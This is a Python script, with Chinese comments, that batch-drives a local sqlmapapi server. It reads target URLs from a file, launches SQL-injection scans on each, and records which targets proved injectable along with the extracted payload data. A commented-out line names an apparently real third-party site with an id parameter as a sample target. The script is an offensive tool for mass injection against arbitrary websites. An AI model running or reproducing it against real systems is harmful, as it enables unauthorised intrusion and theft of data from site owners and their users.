# Tested on Windows 10 Python3.7.9
# Author : Lyscf
# 2021.8.4 V1.3


import requests
import json
import time

print('[+]Automatically opening sqlmapapi...')

# 使用前请打开sqlmapapi，win和Linux的执行语句不同，不写了（主要是懒）

taskIDs = []


# 用来存所有的TaskID

def get_new_task_id():
    global taskIDs
    # 共用TaskID
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36'
    }
    url = 'http://127.0.0.1:8775/task/new'
    res = requests.get(url=url, headers=headers)
    jsons = res.json()
    print('[+]Setting taskID: ' + jsons['taskid'])
    taskID = jsons['taskid']
    taskIDs.append(taskID)
    # 存进TaskIDs里面
    taskID_file = open('taskids.txt', 'a+')
    taskID_file.write(taskID + '\r')
    taskID_file.close()
    return taskID


def get_scan(taskID, host):
    url = 'http://127.0.0.1:8775/scan/'
    url = url + taskID + '/start'
    data = {'url': host,
            'risk': 2
            }
    data = json.dumps(data)
    print('[+]Sending data :' + data)
    headers = {'Content-Type': 'application/json'}
    res = requests.post(url, headers=headers, data=data)
    return res.json()


# 用来写扫描配置

def scan_start(taskID):
    url = 'http://127.0.0.1:8775/scan/' + taskID + '/start'
    res = requests.get(url)
    print('[+]Task ID:' + taskID + 'scanning start')
    return res.text


# 扫描开始


def get_all_scan_status():
    url = 'http://127.0.0.1:8775/admin/list'
    res = requests.get(url)
    print(res.json())
    return res.json()


# 检查所有扫描的进度


def get_scan_log(taskID):
    url = 'http://127.0.0.1:8775/scan/' + taskID + '/log'
    res = requests.get(url)
    print(res.json())
    return res.json()


# 读取单个Task的扫描日志

def test_target(url):
    taskID = get_new_task_id()
    get_scan(taskID, url)
    scan_start(taskID)


# 对单个URL发送测试


# test_target('http://ylhfdc.com/cp-info.php?id=52')


def get_scan_result(taskID):
    url = 'http://127.0.0.1:8775/scan/' + taskID + '/data'
    res = requests.get(url)
    payloaad = res.text
    if 'payload' in payloaad:
        print('[√]inject successful!!!')
        return True
    else:
        print('[×]inject faild')
        return False


# 查询单个TaskID的输出情况，返回布尔值（成功情况）

def get_payload(taskID):
    url = 'http://127.0.0.1:8775/scan/' + taskID + '/data'
    res = requests.get(url)
    print(res.json())
    jsons = res.json()
    print(jsons['data'])
    data = str(jsons['data'])
    result_file = open('sqlmapresult.txt', 'a+', encoding='utf-8')
    # for line in data:
    #    if '{' in line:
    #        result_file.write(line + '\n')
    #    elif'}' in file:
    #        result_file.write(line + '\n')
    #    elif '[' in line:
    #        result_file.write(line + '\n')
    #    elif ']' in line:
    #        result_file.write(line + '\n')
    #   else:
    #        result_file.write(line)
    # 别看了换行不可能修了 这辈子都不可能修了
    result_file.write(data)
    result_file.close()

    return jsons['data']


# 查询单个TaskID的输出情况，返回输出的payload


file = open('target.txt', 'r', encoding='utf-8')
for urls in file:
    urls = urls.strip('\n')
    # 去除换行符
    print('[+]testing' + urls)
    test_target(urls)
    time.sleep(6)
    # 延迟防止线程过多，当前并行数量：10
    # 当前并行峰值:50

time.sleep(15)
# 等待所有注入结束，延迟自己调，15s一般够用了

for id in taskIDs:
    if get_scan_result(id) == True:
        get_payload(id)
    else:
        continue

# 对所有TaskID进行遍历，检测注入情况，输出payload
